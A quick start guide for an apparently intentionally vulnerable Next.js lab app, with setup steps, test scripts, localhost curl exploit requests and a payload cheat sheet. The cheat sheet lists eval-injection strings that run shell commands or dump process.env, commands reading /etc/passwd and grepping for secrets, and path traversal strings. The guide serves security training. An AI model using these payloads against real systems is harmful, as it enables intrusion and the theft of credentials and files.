# Quick Start Guide

## 1. Setup (30 seconds)

```bash
cd nextjs-vulsite
./setup.sh
```

Or manually:
```bash
npm install
chmod +x scripts/*.sh
```

## 2. Start Server

```bash
npm run dev
```

Access at: http://localhost:3000

## 3. Test Vulnerabilities

### Quick Test
```bash
cd scripts
./test-all.sh
```

### Individual Tests
```bash
./test-eval-injection.sh      # Eval injection tests
./test-form-rce.sh            # Form-based RCE
./test-api-exploit.sh         # API exploitation
./test-header-injection.sh    # Header injection
./test-file-read.sh           # File read exploit
```

## 4. Manual Testing

### Eval Injection
Visit: http://localhost:3000/vulnerable/eval-injection?input='); alert('XSS'); //

### Command Execution
```bash
curl -X POST http://localhost:3000/api/vulnerable-exec \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'
```

### Form RCE
```bash
curl -X POST http://localhost:3000/api/vulnerable-submit \
  -H "Content-Type: application/json" \
  -d '{"name": "test", "message": "'\'''); require('\''child_process'\'').exec('\''whoami'\''); //"}'
```

### File Read
```bash
curl -X POST http://localhost:3000/api/vulnerable-file-read \
  -H "Content-Type: application/json" \
  -d '{"filePath": "./package.json"}'
```

## 5. Explore Pages

### Vulnerable Examples
- http://localhost:3000/vulnerable/eval-injection
- http://localhost:3000/vulnerable/form-submission
- http://localhost:3000/vulnerable/api-route
- http://localhost:3000/vulnerable/header-injection
- http://localhost:3000/vulnerable/dynamic-import

### Secure Examples
- http://localhost:3000/secure/sanitized-input
- http://localhost:3000/secure/validated-form
- http://localhost:3000/secure/protected-api
- http://localhost:3000/secure/csp-enabled

## 6. Payloads Cheat Sheet

### Eval Injection
```
'); alert('XSS'); //
'); require('child_process').exec('whoami'); //
'); console.log(process.env); //
'); global.pwned = true; //
```

### Command Injection
```
whoami
pwd && ls -la
cat /etc/passwd
env | grep -i secret
```

### Path Traversal
```
../../../etc/passwd
../../package.json
../../../../etc/hosts
```

### Form Injection
```
'); require('fs').readFileSync('./package.json'); //
'); Object.keys(process.env).forEach(k => console.log(k)); //
```

## 7. Stop Server

Press `Ctrl+C` in the terminal running the dev server

## Troubleshooting

### Port in use
```bash
lsof -ti:3000 | xargs kill -9
npm run dev
```

### Dependencies error
```bash
rm -rf node_modules package-lock.json
npm install
```

### Scripts not executable
```bash
chmod +x scripts/*.sh
```

## ⚠️ Remember

- **ONLY** use in isolated environments
- **NEVER** deploy to production
- **ALWAYS** get authorization before testing

---

For detailed documentation, see [README.md](README.md)
